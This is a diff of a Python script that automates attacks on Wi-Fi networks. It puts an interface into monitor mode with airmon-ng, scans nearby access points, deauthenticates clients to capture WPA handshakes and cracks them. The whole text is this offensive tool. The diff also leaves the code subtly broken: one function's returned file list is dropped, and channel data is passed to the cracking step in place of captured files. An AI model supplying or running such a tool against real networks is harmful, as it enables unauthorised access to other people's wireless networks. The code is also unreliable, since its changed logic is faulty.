@@ -1,5 +1,6 @@
 import os, sys, subprocess, time, csv
 
+
 def start_airmon(network_interface):
 	subprocess.call(["x-terminal-emulator", "-e", "airmon-ng"])
 	subprocess.call(["x-terminal-emulator", "-e", "airmon-ng check kill"])
@@ -35,6 +36,7 @@ def parse(filename):
 	stations_list = z
 
 	return stations_list
+
 def extract(stations_list):
 
 	#DATA FROM STATIONS (ACCESS POINTS)
@@ -124,7 +126,7 @@ def mon_networks_for_handshake(mon_network_interface, ap_mac, ap_name, ap_ch):
 		except:
 			print("An exception occured while deleting the files.")
 
-	return ap_name, ap_mac, filename_list
+	return ap_mac, ap_name, filename_list
 
 def crack(ap_mac, filename_list):
 
@@ -149,8 +151,8 @@ def wait_timeout(proc, timeout):
 			proc.kill()
 		time.sleep(interval)
 
-def cleanup(c):
-	os.remove(c)
+def cleanup(file):
+	os.remove(file)
 
 #PUT HERE YOUR NETWORK INTERFACE
 network_interface = "wlan1"
@@ -165,23 +167,23 @@ mon_network_interface = start_airmon(network_interface)
 found_networks_csv = mon_networks(timeout,mon_network_interface)
 
 #PARSE DATA FROM NETWORK TRAFIC
- stations_list = parse(found_networks_csv)
+stations_list = parse(found_networks_csv)
 
 #EXTRACTING THE NEEDED DATA FROM THE LISTS
 ap_mac, ap_name, ap_ch = extract(stations_list)
 
 #DEAUTH AND CAPTURE HANDSHAKE
-j, k, l = mon_networks_for_handshake(mon_network_interface, ap_mac, ap_name, ap_ch)
+mon_networks_for_handshake(mon_network_interface, ap_mac, ap_name, ap_ch)
 
 captured_handshakes_string = "";
-for index, row in enumerate(j):
-	captured_handshakes_string += j[index] + ", "
+for index, row in enumerate(ap_name):
+	captured_handshakes_string += ap_name[index] + ", "
 
 print("---------------------------------------------------------")
 print("Handshakes captured from: " + captured_handshakes_string)
 
 #CRACK THE HANDSHAKES
-crack(k,l)
+crack(ap_mac, ap_ch)
 
 #DELETE GENERATED FILES
 cleanup(found_networks_csv)
